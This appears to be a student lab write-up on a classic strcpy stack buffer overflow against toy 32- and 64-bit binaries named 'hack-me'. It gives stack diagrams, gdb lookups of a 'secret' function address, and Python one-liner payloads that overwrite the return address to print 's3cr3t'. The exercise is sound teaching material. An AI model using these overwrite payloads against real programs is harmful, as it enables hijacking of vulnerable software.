Basic Exploitation:

1) Any ASCII string with 300 characters does the job for both versions. (sample available in crashstring.txt)

2) The program crashes because it calls the function "strcpy(*dst, *src)",
which copies every byte from src to dst until it finds a null character in the
src string, which is also copied, but ends the function. What ends up happening
is that, if there are more bytes in src than space available in dst, it will
continue to write new characters at out-ouf-boundaries addresses.

Stack before the crash (strcpy executing, just about to fill last 3 spaces of dst and overflow):
| ..........  |
| 0x080484d7  | < RIP (saved IP)
| 0xf7e42c70  | < IP
|_____________| 
| ?  ?  ?  x  | < end of space available for dst
| w  v  u  t  | < dst
| s  r  q  p  | < dst
| . . . . . . | ...

Stack after the crash (strcpy fills registers within overflow and crashes with invalid address):
| ..........  |
| 0x39383736  | < RIP (saved IP)
| 0x35343332  | < IP
|_____________| 
| 1  z  y  x  | < end of space available for dst
| w  v  u  t  | < dst
| s  r  q  p  | < dst
| . . . . . . | ...

3) a) We can get the address using gdb and the command "info address secret"
(gdb) info address secret
Symbol "secret" is at 0x8048480 in a file compiled without debugging.

3) b) We need only one line, so we can use the following python one-liner tool:
$ python -c 'print "\x80\x84\x04\x08"*68' > input32.txt

3) c) To test this:
$ ./hack-me.32 $(cat input32.txt)
It prints "s3cr3t", which means we succeeded.

4) 64-version:
a) (gdb) info address secret
Symbol "secret" is at 0x4005e0 in a file compiled without debugging.

b) This time, we must be careful with possible null bytes and padding of the
address, I ended up with this:
python -c 'print "a"*280  + "\xe0\x05\x40"' > input64.txt 

c) ./hack-me.64 $(cat input64.txt)
"s3cr3t" again :)

